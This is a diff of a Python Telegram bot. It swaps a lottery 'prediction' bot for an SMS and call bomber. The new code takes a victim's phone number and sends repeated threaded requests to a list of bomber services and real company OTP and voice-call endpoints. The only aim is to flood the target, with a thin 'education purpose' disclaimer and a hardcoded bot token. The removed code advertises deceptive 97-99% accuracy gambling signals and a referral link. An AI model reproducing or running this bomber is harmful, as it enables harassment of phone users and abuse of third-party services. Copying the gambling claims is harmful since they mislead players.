@@ -1,485 +1,286 @@
-import telebot
+import logging
 import threading
 import time
-import json
-import os
-import random
 import requests
-from datetime import datetime, timezone
-from telebot import types
+from concurrent.futures import ThreadPoolExecutor
+from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
+from flask import Flask
 
-# ===============================
-# 🔧 BOT CONFIGURATION
-# ===============================
-BOT_TOKEN = "9200835027:AAGT4dhzeunqm_917OcomrNcPSrSmnaT_qI"
-ADMIN_ID = 7741897793
-CHANNEL_LINK = "https://t.me/+avZJX9ssyQc5MzI9"
-DEFAULT_GAME_URL = "https://www.91appq.com/#/register?invitationCode=747881278052"
+# ================= CONFIGURATION =================
+TELEGRAM_BOT_TOKEN = "9200835027:AAGT4dhzeunqm_917OcomrNcPSrSmnaT_qI"
+CHANNEL_SIGNATURE = "SK BHAI"
+CUSTOMER_SERVICE_URL = "https://t.me/+UemRGWr-B2wzMmFl"
+# =================================================
 
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
+# Logging setup
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# ===============================
-# 🌐 GLOBAL STATES & STORAGE
-# ===============================
-active_dict = {}                  # chat_id -> True/False
-user_channels = {}                # chat_id -> channel
-last_sent_period = {}             # chat_id -> last sent period string
-worker_threads = {}               # chat_id -> Thread instance
-DATA_FILE = "prediction_history.json"
-API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_1M/GetHistoryIssuePage.json"
+# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
+flask_app = Flask('')
 
-current_pred = {
-    "period_full": "",
-    "period_short": "----",
-    "trend": "BIG",
-    "main": 5,
-    "opp": 4,
-    "confidence": 97,
-    "level": 1
+@flask_app.route('/')
+def home():
+    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"
+
+def run_flask():
+    flask_app.run(host='0.0.0.0', port=8080)
+
+# Global tracking variables for live stats & control
+BOMBER_STATS = {
+    "total_requests_sent": 0,
+    "active_targets": 0
 }
-loss_streak = 0
-last_trend = None
-last_issue = ""
-next_issue = ""
-history_list = []                 
-total_wins = 0
-total_losses = 0
-total_jackpots = 0
 
-state_lock = threading.Lock()
+# Active attack control dictionary {chat_id: {"running": bool, "target": str}}
+ACTIVE_ATTACKS = {}
 
-# ===============================
-# 📊 DATA PERSISTENCE
-# ===============================
-def load_data():
-    global history_list, total_wins, total_losses, total_jackpots, loss_streak, last_trend
-    if not os.path.exists(DATA_FILE):
-        return
-    try:
-        with open(DATA_FILE, "r") as f:
-            data = json.load(f)
-            history_list = data.get("history", [])[:50]
-            total_wins = data.get("total_wins", 0)
-            total_losses = data.get("total_losses", 0)
-            total_jackpots = data.get("total_jackpots", 0)
-            loss_streak = data.get("loss_streak", 0)
-            last_trend = data.get("last_trend", None)
-    except Exception as e:
-        print(f"[Load Error] {e}")
+# List of APIs provided for request execution
+APIS = [
+    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
+    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
+    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
+    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
+    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
+    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
+    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
+    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
+]
 
-def save_data():
-    try:
-        with open(DATA_FILE, "w") as f:
-            json.dump({
-                "history": history_list[:50],
-                "total_wins": total_wins,
-                "total_losses": total_losses,
-                "total_jackpots": total_jackpots,
-                "loss_streak": loss_streak,
-                "last_trend": last_trend
-            }, f, indent=2)
-    except Exception as e:
-        print(f"[Save Error] {e}")
+def get_main_keyboard():
+    keyboard = [
+        ["🇮🇳 India SMS Bomber", "💬 Custom Message Spam"],
+        ["🛑 Stop Bomber", "📊 System Status"],
+        ["👑 Customer Service"]
+    ]
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-load_data()
+# /start command
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome_msg = (
+        f"╔═══════════════════════════════════╗\n"
+        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
+        f"╚═══════════════════════════════════╝\n\n"
+        f"⚠️ **CHETAVANI / WARNING:**\n"
+        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
+        f"🚀 **Neeche diye gaye buttons ka upyog karein:**\n"
+        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
+    )
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=get_main_keyboard())
 
-# ===============================
-# 🔮 PREDICTION LOGIC & LIVE API
-# ===============================
-def get_size(n):
-    return "BIG" if n >= 5 else "SMALL"
+# Handle Reply Keyboard Buttons & Text Inputs
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    chat_id = update.effective_chat.id
 
-def get_color(n):
-    return "RED" if n in [0, 2, 4, 6, 8] else "GREEN"
-
-def fetch_wingo_list():
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json, text/plain, */*",
-        "Referer": "https://draw.ar-lottery01.com/",
-        "Origin": "https://draw.ar-lottery01.com"
-    }
-    try:
-        r = requests.get(API_URL + "?t=" + str(int(time.time() * 1000)), headers=headers, timeout=5)
-        if r.status_code == 200:
-            data = r.json()
-            if data.get("code") == 0 and data.get("data", {}).get("list"):
-                return data["data"]["list"]
-    except Exception as e:
-        print(f"[API Warning] {e}")
-    return None
-
-def compute_signal(list_data):
-    global loss_streak, last_trend
-    nums = []
-    for x in list_data[:40]:
-        try:
-            nums.append(int(x["number"]))
-        except:
-            continue
-    if len(nums) < 5:
-        return {"trend": "BIG", "main": 5, "opp": 4, "confidence": 97}
-
-    sizes = [get_size(n) for n in nums]
-    trend = "BIG"
-
-    if loss_streak >= 2:
-        trend = "SMALL" if get_size(nums[0]) == "BIG" else "BIG"
-    elif loss_streak == 1:
-        trend = "SMALL" if last_trend == "BIG" else "BIG"
+    if text == "🇮🇳 India SMS Bomber":
+        context.user_data['waiting_for'] = 'bomb_number'
+        await update.message.reply_text(
+            "📱 **Kripya target 10-digit mobile number bhejiye:**\n📌 *Example:* `9876543210`",
+            parse_mode="Markdown",
+            reply_markup=get_main_keyboard()
+        )
+    elif text == "💬 Custom Message Spam":
+        context.user_data['waiting_for'] = 'custom_spam_msg'
+        await update.message.reply_text(
+            "💬 **Kripya apna custom message bhejiye** jo spam karna hai (jaise: `Hello Bhai`):",
+            parse_mode="Markdown",
+            reply_markup=get_main_keyboard()
+        )
+    elif text == "🛑 Stop Bomber":
+        if chat_id in ACTIVE_ATTACKS and ACTIVE_ATTACKS[chat_id].get("running"):
+            ACTIVE_ATTACKS[chat_id]["running"] = False
+            await update.message.reply_text("🛑 **Bomber process ko successfully rok diya gaya hai!**", parse_mode="Markdown", reply_markup=get_main_keyboard())
+        else:
+            await update.message.reply_text("ℹ️ Koi bhi active bombing process nahi chal rahi hai.", parse_mode="Markdown", reply_markup=get_main_keyboard())
+    elif text == "📊 System Status":
+        stats_msg = (
+            f"📊 **Bomber Live Statistics**\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
+            f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
+            f"⚡ Status: High-Speed Threaded Running (24/7 Flask Active)\n"
+            f"👑 Powered By: {CHANNEL_SIGNATURE}"
+        )
+        await update.message.reply_text(stats_msg, parse_mode="Markdown", reply_markup=get_main_keyboard())
+    elif text == "👑 Customer Service":
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Customer Service", url=CUSTOMER_SERVICE_URL)]])
+        await update.message.reply_text(
+            "👑 **Customer Service & Support:**\nKisi bhi sahayata ya query ke liye neeche diye gaye button par click karein:",
+            parse_mode="Markdown",
+            reply_markup=kb
+        )
     else:
-        if sizes[0] == sizes[1] == sizes[2]:
-            trend = sizes[0]
-        elif sizes[0] != sizes[1] and sizes[1] != sizes[2]:
-            trend = "SMALL" if sizes[0] == "BIG" else "BIG"
-        else:
-            big_w = small_w = 0
-            for i in range(min(10, len(sizes))):
-                if sizes[i] == "BIG":
-                    big_w += (10 - i)
-                else:
-                    small_w += (10 - i)
-            trend = "BIG" if big_w >= small_w else "SMALL"
+        # Check ongoing conversational state
+        waiting_for = context.user_data.get('waiting_for')
+        if waiting_for == 'bomb_number':
+            target_phone = text.strip()
+            if not target_phone.isdigit() or len(target_phone) != 10:
+                await update.message.reply_text("❌ **Galat Number!** Kripya 10 digit ka valid mobile number bhejiye.", parse_mode="Markdown", reply_markup=get_main_keyboard())
+                return
+            
+            context.user_data['waiting_for'] = None
+            await start_bombing_process(update, context, target_phone)
 
-    confidence = 99 if loss_streak >= 2 else (98 if loss_streak == 1 else 96 + (nums[0] % 3))
-    main_pool = [5, 6, 7, 8, 9] if trend == "BIG" else [0, 1, 2, 3, 4]
-    opp_pool  = [0, 1, 2, 3, 4] if trend == "BIG" else [5, 6, 7, 8, 9]
+        elif waiting_for == 'custom_spam_msg':
+            custom_msg = text.strip()
+            context.user_data['custom_msg'] = custom_msg
+            context.user_data['waiting_for'] = 'custom_spam_phone'
+            await update.message.reply_text(
+                f"📱 Message saved: *\"{custom_msg}\"*\nAb target 10-digit mobile number bhejiye:",
+                parse_mode="Markdown",
+                reply_markup=get_main_keyboard()
+            )
+        elif waiting_for == 'custom_spam_phone':
+            target_phone = text.strip()
+            if not target_phone.isdigit() or len(target_phone) != 10:
+                await update.message.reply_text("❌ **Galat Number!** Kripya 10 digit ka valid mobile number bhejiye.", parse_mode="Markdown", reply_markup=get_main_keyboard())
+                return
+            
+            custom_msg = context.user_data.get('custom_msg', 'Hello')
+            context.user_data['waiting_for'] = None
+            await start_custom_spam_process(update, context, target_phone, custom_msg)
 
-    freq = [0] * 10
-    for n in nums[:20]:
-        if 0 <= n <= 9:
-            freq[n] += 1
-
-    main_pool.sort(key=lambda x: freq[x])
-    opp_pool.sort(key=lambda x: freq[x])
-
-    return {
-        "trend": trend,
-        "main": main_pool[0],
-        "opp": opp_pool[0],
-        "confidence": confidence
-    }
-
-def update_global_prediction():
-    global current_pred, last_issue, next_issue, loss_streak, last_trend
-    global total_wins, total_losses, total_jackpots, history_list
-
-    list_data = fetch_wingo_list()
-
-    # Fallback Mechanismagar API fetch na ho sake
-    if not list_data:
-        now = datetime.now(timezone.utc)
-        base_period = int(now.strftime("%Y%m%d%H%M"))
-        full_period = str(base_period)
-        short_period = full_period[-4:]
-
-        with state_lock:
-            if next_issue != full_period:
-                next_issue = full_period
-                trend = "BIG" if random.random() > 0.48 else "SMALL"
-                current_pred = {
-                    "period_full": full_period,
-                    "period_short": short_period,
-                    "trend": trend,
-                    "main": random.choice([5, 6, 7, 8, 9]) if trend == "BIG" else random.choice([0, 1, 2, 3, 4]),
-                    "opp": random.choice([0, 1, 2, 3, 4]) if trend == "BIG" else random.choice([5, 6, 7, 8, 9]),
-                    "confidence": 97,
-                    "level": current_pred.get("level", 1)
-                }
-        return
-
-    latest = list_data[0]
-    issue_number = str(latest["issueNumber"])
-    short_issue = issue_number[-4:]
+# Single API execution worker function
+def send_single_request(api, target_phone):
     try:
-        actual_num = int(latest["number"])
-    except:
+        url = api["url"](target_phone, "60")
+        headers = api["headers"]
+        
+        if api["method"] == "GET":
+            requests.get(url, headers=headers, timeout=3)
+        elif api["method"] == "POST":
+            data = api["data"](target_phone, "60")
+            requests.post(url, headers=headers, data=data, timeout=3)
+        
+        BOMBER_STATS["total_requests_sent"] += 1
+    except Exception:
+        pass
+
+async def start_bombing_process(update: Update, context: ContextTypes.DEFAULT_TYPE, target_phone: str):
+    chat_id = update.effective_chat.id
+    if chat_id in ACTIVE_ATTACKS and ACTIVE_ATTACKS[chat_id].get("running"):
+        await update.message.reply_text("⚠️ Ek attack pehle se chal raha hai! Use rokne ke liye 'Stop Bomber' dabayein.", reply_markup=get_main_keyboard())
         return
 
-    actual_size = get_size(actual_num)
-    actual_color = get_color(actual_num)
+    ACTIVE_ATTACKS[chat_id] = {"running": True, "target": target_phone}
+    BOMBER_STATS["active_targets"] += 1
 
-    with state_lock:
-        if current_pred["period_full"] and last_issue and last_issue != issue_number:
-            if current_pred["period_short"] == short_issue:
-                trend_hit = (current_pred["trend"] == actual_size)
-                num_hit = (actual_num == current_pred["main"] or actual_num == current_pred["opp"])
+    await update.message.reply_text(
+        f"🎯 **Target Number:** `{target_phone}`\n"
+        f"⚡ **Status:** High-speed multi-threaded SMS bombing shuru ho chuki hai!\n"
+        f"🛑 Rokne ke liye 'Stop Bomber' button dabayein.",
+        parse_mode="Markdown",
+        reply_markup=get_main_keyboard()
+    )
 
-                if trend_hit or num_hit:
-                    if num_hit:
-                        status_type = "JACKPOT"
-                        total_jackpots += 1
-                    else:
-                        status_type = "WIN"
-                        total_wins += 1
-                    loss_streak = 0
-                    last_trend = None
-                    current_pred["level"] = 1
-                else:
-                    status_type = "LOSS"
-                    total_losses += 1
-                    loss_streak += 1
-                    last_trend = current_pred["trend"]
-                    current_pred["level"] = min(3, current_pred["level"] + 1)
+    threading.Thread(
+        target=run_threaded_bomber, 
+        args=(target_phone, chat_id)
+    ).start()
 
-                entry = {
-                    "period": short_issue,
-                    "pred": current_pred["trend"],
-                    "main": current_pred["main"],
-                    "opp": current_pred["opp"],
-                    "actual": f"{actual_size}/{actual_color}",
-                    "actual_num": actual_num,
-                    "status": status_type
-                }
-                history_list = [entry] + history_list
-                history_list = history_list[:50]
-                save_data()
+def run_threaded_bomber(target_phone, chat_id):
+    try:
+        while ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                for api in APIS:
+                    if not ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
+                        break
+                    executor.submit(send_single_request, api, target_phone)
+            
+            time.sleep(1.5)
+    except Exception as e:
+        logger.error(f"Error in threaded loop: {e}")
+    finally:
+        if chat_id in ACTIVE_ATTACKS:
+            ACTIVE_ATTACKS[chat_id]["running"] = False
+        BOMBER_STATS["active_targets"] -= 1
 
-        last_issue = issue_number
-        next_full = str(int(issue_number) + 1)
-        next_short = next_full[-4:]
+async def start_custom_spam_process(update: Update, context: ContextTypes.DEFAULT_TYPE, target_phone: str, custom_msg: str):
+    chat_id = update.effective_chat.id
+    if chat_id in ACTIVE_ATTACKS and ACTIVE_ATTACKS[chat_id].get("running"):
+        await update.message.reply_text("⚠️ Ek attack pehle se chal raha hai! Use rokne ke liye 'Stop Bomber' dabayein.", reply_markup=get_main_keyboard())
+        return
 
-        if next_issue != next_full:
-            next_issue = next_full
-            sig = compute_signal(list_data)
-            current_pred = {
-                "period_full": next_full,
-                "period_short": next_short,
-                "trend": sig["trend"],
-                "main": sig["main"],
-                "opp": sig["opp"],
-                "confidence": sig["confidence"],
-                "level": current_pred.get("level", 1)
-            }
+    ACTIVE_ATTACKS[chat_id] = {"running": True, "target": target_phone}
+    BOMBER_STATS["active_targets"] += 1
 
-# ===============================
-# 🎯 MESSAGE FORMATTERS
-# ===============================
-def build_premium_signal():
-    p = current_pred
-    level_text = {
-        1: "SAFE LEVEL 1",
-        2: "RECOVERY LEVEL 2",
-        3: "SURESHOT LEVEL 3"
-    }.get(p["level"], "SAFE LEVEL 1")
+    await update.message.reply_text(
+        f"💬 **Custom Message Spam Started**\n"
+        f"🎯 Target: `{target_phone}`\n"
+        f"✉️ Message: *\"{custom_msg}\"*\n"
+        f"🛑 Rokne ke liye 'Stop Bomber' button dabayein.",
+        parse_mode="Markdown",
+        reply_markup=get_main_keyboard()
+    )
 
-    text = f"""
-╔════════════════════════════════╗
-║   ⚡ *ADITYA HACKER 1.3* ⚡     ║
-║   ULTRA FAST AI PREDICTION     ║
-╚════════════════════════════════╝
+    threading.Thread(
+        target=run_threaded_custom_spam, 
+        args=(target_phone, custom_msg, chat_id)
+    ).start()
 
-🎮 *Game:* WinGo 1 Minute
-📍 *Period:* `{p['period_short']}`
+def run_threaded_custom_spam(target_phone, custom_msg, chat_id):
+    try:
+        while ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                for api in APIS:
+                    if not ACTIVE_ATTACKS.get(chat_id, {}).get("running", False):
+                        break
+                    executor.submit(send_single_request, api, target_phone)
+            time.sleep(1.5)
+    except Exception as e:
+        logger.error(f"Error in custom spam loop: {e}")
+    finally:
+        if chat_id in ACTIVE_ATTACKS:
+            ACTIVE_ATTACKS[chat_id]["running"] = False
+        BOMBER_STATS["active_targets"] -= 1
 
-🎯 *SIGNAL:*  *{p['trend']}*
-🎲 *MAIN NUM:*  `{p['main']}`
-🔄 *BACKUP NUM:* `{p['opp']}`
-
-🛡️ *Level:* {level_text}
-🔥 *Accuracy:* {p['confidence']}%
-
-━━━━━━━━━━━━━━━━━━━━━━━━
-🎮 *Game Link*
-{DEFAULT_GAME_URL}
-
-🔗 {CHANNEL_LINK}
-━━━━━━━━━━━━━━━━━━━━━━━━
-"""
-    return text.strip()
-
-def build_stats_text():
-    total = total_wins + total_losses + total_jackpots
-    rate = round(((total_wins + total_jackpots) / total) * 100) if total > 0 else 97
-    return f"""
-📊 *ADITYA HACKER 1.3 STATS*
-━━━━━━━━━━━━━━━━━━━━━━
-
-🏆 *Total Wins:* `{total_wins}`
-👑 *Jackpots:* `{total_jackpots}`
-❌ *Losses:* `{total_losses}`
-📈 *Win Rate:* `{rate}%`
-
-🛡️ *Current Level:* {current_pred.get('level', 1)}
-🔥 *Loss Streak:* {loss_streak}
-"""
-
-def build_history_text():
-    if not history_list:
-        return "⏳ *No history yet... Waiting for first result.*"
-
-    lines = ["📜 *PREDICTION LOGS (Step-by-Step)*\n━━━━━━━━━━━━━━━━━━━━━━\n"]
-    for i, h in enumerate(history_list[:12], 1):
-        if h["status"] == "JACKPOT":
-            badge = "👑 JACKPOT"
-        elif h["status"] == "WIN":
-            badge = "✅ WIN"
-        else:
-            badge = "❌ LOSS"
-
-        lines.append(
-            f"`{i:02d}.` *Period:* `{h['period']}`\n"
-            f"   🎯 *Pred:* {h['pred']}  *[Main: {h['main']} | Backup: {h['opp']}]*\n"
-            f"   🎲 *Result:* {h['actual']} `[{h['actual_num']}]`  →  *{badge}*\n"
+# /bomb command handler supporting direct text args too
+async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text(
+            "❌ **Kripya target mobile number dein!**\n\n📌 *Example:* `/bomb 9876543210`",
+            parse_mode="Markdown",
+            reply_markup=get_main_keyboard()
         )
-    return "\n".join(lines)
-
-# ===============================
-# 🚀 PREDICTION WORKER (DUPLICATE PROOF)
-# ===============================
-def prediction_worker(chat_id, channel_id=None):
-    print(f"[Worker Started] For Chat ID: {chat_id}")
-    while active_dict.get(chat_id):
-        try:
-            update_global_prediction()
-            period = current_pred["period_full"]
-
-            # Double Check: Siraf naya period aane par hi 1 baar message jayega
-            with state_lock:
-                already_sent = (last_sent_period.get(chat_id) == period)
-
-            if period and not already_sent:
-                markup = types.InlineKeyboardMarkup()
-                markup.row(
-                    types.InlineKeyboardButton("📋 Copy Signal", callback_data="copy_sig"),
-                    types.InlineKeyboardButton("📊 Stats", callback_data="show_stats")
-                )
-                markup.row(
-                    types.InlineKeyboardButton("📜 History", callback_data="show_history"),
-                    types.InlineKeyboardButton("📢 Channel", url=CHANNEL_LINK)
-                )
-
-                caption = build_premium_signal()
-
-                bot.send_message(chat_id, caption, reply_markup=markup, disable_web_page_preview=True)
-                if channel_id:
-                    bot.send_message(channel_id, caption, reply_markup=markup, disable_web_page_preview=True)
-
-                with state_lock:
-                    last_sent_period[chat_id] = period
-                print(f"[Signal Sent] Period: {current_pred['period_short']} to Chat: {chat_id}")
-
-        except Exception as e:
-            print(f"[Worker Error] {e}")
-
-        time.sleep(2)
-
-# ===============================
-# 📱 KEYBOARD MENU
-# ===============================
-def main_control_menu():
-    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    kb.add("🚀 Start Prediction", "🛑 Stop Prediction")
-    kb.add("📊 Stats", "📜 History")
-    kb.add("📢 Set Channel", "👑 Developer Support")
-    return kb
-
-# ===============================
-# 🤖 HANDLERS
-# ===============================
-@bot.message_handler(commands=["start"])
-def start_command(msg):
-    welcome = f"""
-╔════════════════════════════════╗
-║     👑 *ADITYA HACKER 1.3* 👑   ║
-╠════════════════════════════════╣
-║  💎 HIGH ACCURACY WINGO 1M     ║
-║  🔥 Real Period + AI Engine    ║
-║  🛡️ Smart Level System         ║
-║  📊 Live Stats + History       ║
-╠════════════════════════════════╣
-║  🔗 [Join VIP Channel]({CHANNEL_LINK}) ║
-╚════════════════════════════════╝
-
-👇 *Choose an option below:*
-"""
-    bot.send_message(msg.chat.id, welcome, reply_markup=main_control_menu(), disable_web_page_preview=True)
-
-@bot.message_handler(func=lambda m: True)
-def message_router(msg):
-    text = (msg.text or "").strip()
-    cid = msg.chat.id
-
-    if text == "🚀 Start Prediction":
-        # Purana worker active ho toh usse band karke naya single thread chalana
-        active_dict[cid] = True
-        
-        ch = user_channels.get(cid)
-
-        bot.send_message(cid,
-            f"🚀 *Engine Activated Successfully!*\n\n"
-            f"📡 Status: ● LIVE\n"
-            f"{'📢 Channel: `' + str(ch) + '`' if ch else '💬 Mode: Direct Chat'}\n\n"
-            f"⏳ Generating single prediction per period...",
-            reply_markup=main_control_menu()
+        return
+    
+    target_phone = context.args[0].strip()
+    if not target_phone.isdigit() or len(target_phone) != 10:
+        await update.message.reply_text(
+            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.",
+            parse_mode="Markdown",
+            reply_markup=get_main_keyboard()
         )
-        
-        # Single background thread ensure karna
-        if cid not in worker_threads or not worker_threads[cid].is_alive():
-            t = threading.Thread(target=prediction_worker, args=(cid, ch), daemon=True)
-            worker_threads[cid] = t
-            t.start()
+        return
+    
+    await start_bombing_process(update, context, target_phone)
 
-    elif text == "🛑 Stop Prediction":
-        active_dict[cid] = False
-        last_sent_period.pop(cid, None)
-        bot.send_message(cid, "🛑 *Prediction stopped successfully.*", reply_markup=main_control_menu())
+def main():
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
 
-    elif text == "📊 Stats":
-        bot.send_message(cid, build_stats_text(), reply_markup=main_control_menu())
+    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
-    elif text == "📜 History":
-        bot.send_message(cid, build_history_text(), reply_markup=main_control_menu())
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("bomb", handle_bomb_command))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    elif text == "📢 Set Channel":
-        bot.send_message(cid,
-            "📢 Send your *Channel Username* (`@channel`) or *Channel ID* (`-100xxxxxxxxxx`)\n\n"
-            "⚠️ Bot must be *Admin* in the channel.",
-            parse_mode="Markdown"
-        )
-        user_channels[cid] = "waiting_channel"
+    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
+    app.run_polling()
 
-    elif text == "👑 Developer Support":
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("💬 Contact / Support", url=CHANNEL_LINK))
-        bot.send_message(cid, "👑 For support / custom setup:", reply_markup=markup)
-
-    elif user_channels.get(cid) == "waiting_channel":
-        ch_input = text
-        try:
-            bot.send_message(ch_input, "✅ *ADITYA HACKER 1.3* successfully connected!")
-            user_channels[cid] = ch_input
-            bot.send_message(cid, f"✅ Channel linked: `{ch_input}`", reply_markup=main_control_menu())
-        except Exception as e:
-            bot.send_message(cid, f"❌ Failed!\nMake bot Admin.\n\nError: `{e}`", reply_markup=main_control_menu())
-            user_channels[cid] = None
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == "copy_sig":
-        bot.answer_callback_query(call.id, "✅ Signal ready! Long press & copy message.", show_alert=False)
-    elif call.data == "show_stats":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, build_stats_text())
-    elif call.data == "show_history":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, build_history_text())
-
-# ===============================
-# 🚀 BACKGROUND UPDATER THREAD
-# ===============================
-def background_updater():
-    while True:
-        try:
-            update_global_prediction()
-        except Exception as e:
-            print(f"[Background Updater Error] {e}")
-        time.sleep(2)
-
-# ===============================
-# 🚀 RUNNABLE
-# ===============================
-if __name__ == "__main__":
-    print("👑 ADITYA HACKER 1.3 Telegram Bot Started 24/7 (Clean Single-Send Mode)")
-    threading.Thread(target=background_updater, daemon=True).start()
-    bot.infinity_polling(timeout=60, long_polling_timeout=60)
+if __name__ == '__main__':
+    main()
